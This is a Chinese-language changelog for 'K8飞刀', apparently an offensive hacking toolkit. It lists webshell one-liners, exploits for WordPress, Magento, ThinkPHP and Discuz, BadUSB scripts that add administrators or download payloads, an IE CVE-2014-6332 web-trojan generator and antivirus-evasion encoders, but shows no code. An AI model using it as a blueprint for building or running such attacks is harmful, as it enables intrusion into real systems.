获取当前时间戳&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150629[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 浏览器模式 修复Cookier伪造欺骗无效的BUG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150628=================================================================================K8飞刀 20150628[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 黑客浏览器伪造IP(VIA/X_FORWARDED_FOR/Client-IP)&nbsp;&nbsp; 20150628[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--非数字非字母PHP一句话&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150628[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Base64编码--PHP反解Base64代码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150624[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--路径转义 \\转\\\\ \\\\转\\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150623[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更新IIS ASPX PHP IP小图标&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150623[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 世界第一电子商务系统 Magento 1.7.0.2 漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150615=================================================================================K8飞刀 20150610[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 批量删除掉线WebShell(使用前先检测存活状态)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150610[u]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--VBS转Teensy脚本支持&amp;符号&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150610[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--选中内容 CMD运行/Bat运行/VBS运行&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150609[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--K8飞刀专用Perl一句话&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150608[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--K8飞刀专用CFM一句话&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150608[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--K8飞刀专用Python一句话&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150608[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--无(单引号和$post)PHP一句话&nbsp;&nbsp;&nbsp;&nbsp; 20150608[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--无(单引号和分号)PHP一句话&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150608[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Acunetix WVS &lt;=9.5 全版本远程代码执行漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150603=================================================================================K8飞刀 20150601[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 导入TXT格式WebShell(格式:Shell地址 空格 密码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150601[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--导入URL(所有文本文件)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150601[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--抓取的URL自动进行URL解码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150601[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--批量检测URL是否存在SQL注入&nbsp;&nbsp;&nbsp; 20150601[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--批量处理URL--保留结尾目录&nbsp;&nbsp;&nbsp;&nbsp; 20150531[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hack模式自动检测当前页面所有URL是否存在SQL注入&nbsp;&nbsp;&nbsp; 20150531[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hack模式--浏览网站自动记录Banner/IP/地理等信息&nbsp;&nbsp;&nbsp; 20150530[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Unicode2Ansi &amp; Ansi2Unicode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150530[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 藏文乱码(首先系统要安装藏文) 很多站用UTF8就搞定&nbsp;&nbsp; 20150529[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 新增欧美系统编码ISO-8859-1(西藏文字)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150529[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 相关功能模块选中项进行高亮显示&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150528[+]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WP用户采集(WP3.41 WP3.52 WP3.61 WP3.81 WP3.88)&nbsp;&nbsp;&nbsp; 20150527[+]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress用户采集(WP4.10 WP4.12 WP4.21 WP4.2b3)&nbsp;&nbsp; 20150526=================================================================================K8飞刀 20150520[+]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 网站子域名扫描/二级域名扫描(渗透大型站点必备)&nbsp;&nbsp;&nbsp;&nbsp; 20150520[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 一键生成EXP功能 调式好的EXP可直接生成EXE工具&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150519[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EXP按钮右键菜单添加生成EXP功能 可直接生成EXE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150518[u]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键调整(相关功能转Hacking) 新增域名解析功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150517[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--加载搜索语法\\批量处理URL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150516[u]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Web提交-PHP/Python/Perl/Flash/jQuery脚本完善&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150515[u]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy 完善相关脚本兼容性&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150515[u]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复WEB提交参数中出现邮箱可能会导致CSRF失败&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150515[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; elfinder &lt;=2.0 rc1 文件上传漏洞 GetShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150512=================================================================================K8飞刀 20150511[u]AutoUpdate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 不再强制自动更新...仅在标题和弹框提示最新版&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150511[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy 完善对笔记本兼容性&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150504[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 其它功能 指定长度字符串生成(比如WP 64K XSS)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150501[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; URL编码 单字符(双引号 #号 :号 /号 -号)互转&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150501[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; URL编码 单字符(单引号 逗号 分号 点号) 互转&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150501=================================================================================K8飞刀 20150425 WP漏洞专版[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress photo-uploader 1.8&nbsp;&nbsp;&nbsp;&nbsp; PHP文件上传漏洞&nbsp; 20150425[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress Simple Ads Manager 2.5.96&nbsp; SQL注入漏洞&nbsp; 20150425[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress Business Intelligence&nbsp;&nbsp; SQL注入漏洞EXP&nbsp; 20150425[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress Security &amp; Firewall 3.9 SQL注入漏洞EXP&nbsp; 20150425[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress Ajax Store Locator 1.2&nbsp; SQL注入漏洞EXP&nbsp; 20150425[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress sp-client-document-manager SQL注入漏洞&nbsp; 20150425[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress Tune Library 1.5.4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL注入漏洞EXP&nbsp; 20150425[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Wordpress MiwoFTP &lt;= 1.0.5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 文件下载漏洞EXP&nbsp; 20150425[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Wordpress NEX-Forms 3.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL注入漏洞EXP&nbsp; 20150425[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Magento Server MAGMI&nbsp; 插件本地包含漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150425[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ThinkPHP &lt;= 2.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 任意代码执行漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150423[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ThinkPHP &lt;=3.1.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL注入漏洞利用EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150423[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Wordpress Mobile Edition 2.7 文件读取EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150422K8飞刀 20150418[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CMS Made Simple 1.2.2 (TinyMCE) SQL注入EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150417[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CMS Made Simple 1.1.2 Remote Code Execution&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150417[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CMS Made Simple 1.4.1 LFI 0day Exploit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150417=================================================================================K8飞刀 20150412 BadUSB专版[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy&nbsp; 过UAC执行任意脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150412[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy&nbsp; 执行自定义BAT脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150412[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy&nbsp; 执行自定义VBS脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150412[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy 添加管理员开启3389&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150412[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VBS脚本(VBS转BAT脚本 VBS转CMD命令渗透常用)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150412[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Win 开启Telnet脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150410[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Win-EN DNS修改脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150410[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Win 添加管理员脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150409[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy(Win&amp;Lnx)下载者脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150406[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Linux&nbsp;&nbsp; 下载者脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150406[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Hacked by&nbsp; 装B脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150324[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Arduino 下载者脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150320[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 帝国备份王万能Cookie登陆后台Exp(需修改时间戳)&nbsp;&nbsp;&nbsp;&nbsp; 20150319[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Ecshop管理员md5转成Cookie 可直接进入2.7.x后台&nbsp;&nbsp;&nbsp;&nbsp; 20150311[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Discuz产品 SupeSite 6.x 7.x 全版本SQL注入EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150311[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Discuz! 7.2 faq.php注入爆表前缀EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150311[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vBulletin 3 &amp; 4 ajax.php SQL注入爆管理Exploit&nbsp;&nbsp;&nbsp;&nbsp; 20150311[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ThinkPHP URL安全漏洞SQL注入爆管理员EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150311[+]GoogleHack&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 新增GoogleHack模块,提高工作效率&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150127[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(文件下载功能)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150121[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP文件管理(无权限+禁用图标 空目录+灰色图标)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150120[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(增加Linux列目录功能)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150120[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(右键增加复制目录结构功能)&nbsp;&nbsp;&nbsp;&nbsp; 20150120[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(文件删除/列目录更新)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150116[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键发送到相关模块,相关功能优化&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150116[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GET和POST提交-流文件保存功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150115[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(文件下载到服务器功能)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150115=================================================================================K8飞刀 20150114[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; URL编码保留Get或Post常用的=号和&amp;符 另附单独转换&nbsp;&nbsp; 20150114[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Discuz! X系列产品升级/转换漏洞 GetShell Exp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150114[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复修改EXP附加URL无法更新的bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150114[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WebShell表新增Shell类型字段,用于区分各种提交方式&nbsp; 20150112[+]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 极速后台扫描(右键增加 复制选中URL 保存扫描结果)&nbsp;&nbsp; 20150109[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(文件上传功能)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150108[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Code代码(去掉代码前序号[格式(序号+空格+代码)])&nbsp;&nbsp;&nbsp; 20150107[+]FixBug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复某些功能网络连接卡死的Bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150107[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善文件管理功能(密码/Ke/证书类-绿色+Key图标&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150106[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WebShell在控状态检测(以是否能执行代码为标准)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150105[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(脚本配置文件-蓝色+设置图标&nbsp;&nbsp;&nbsp; 20150101[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(常用目录-紫色目录图标显示&nbsp;&nbsp;&nbsp;&nbsp; 20150101[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(WebShell类-普通紫色+黑脸图标&nbsp; 20150101[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(提权类黑客类-高亮紫色+图标)&nbsp;&nbsp; 20141231[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复WebShell图片木马合成不支持空格路径的Bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141228=================================================================================K8飞刀 20141220[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 进制转换(10进制\\2进制\\8进制\\16进制)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141220[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; File2JsHex(文件转成JS16进制 网页内嵌木马常用)&nbsp;&nbsp;&nbsp;&nbsp; 20141219[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WebShell图片木马合成(上传绕过WAF或留包含后门)&nbsp;&nbsp;&nbsp;&nbsp; 20141218[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VBS脚本随机ASCII加密解密(一秒免杀IE神洞网马)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141214=================================================================================K8飞刀 20141208 CSRF专版[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Post提交代码(Flash/jQuery/Flash/Python/Perl/PHP)&nbsp; 20141208[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Python Post参数 与 常规Post参数 互转(方便写EXP)&nbsp;&nbsp; 20141208[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Flash&nbsp; Post参数 与 常规Post参数 互转(XSS-CSRF用)&nbsp; 20141208[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jQuery Post参数 与 常规Post参数 互转(XSS-CSRF用)&nbsp; 20141206[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加WordPress后台主题GetShell代码 + 右键菜单美化&nbsp; 20141203[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加右键复制 Web全部信息 Banner/IP/地址位置信息&nbsp;&nbsp; 20141202=================================================================================K8飞刀 20141130[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 选中URL可右键使用 Firefox\\Chrome\\IE 浏览器打开&nbsp;&nbsp;&nbsp; 20141128[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 正则截取数据(结果支持同时提取8个参数 灵活度更高)&nbsp; 20141128K8飞刀 20141125 IE神洞版[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IE神洞 MS14-065 CVE-2014-6332 网马生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141125[+]XSSanalysis&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 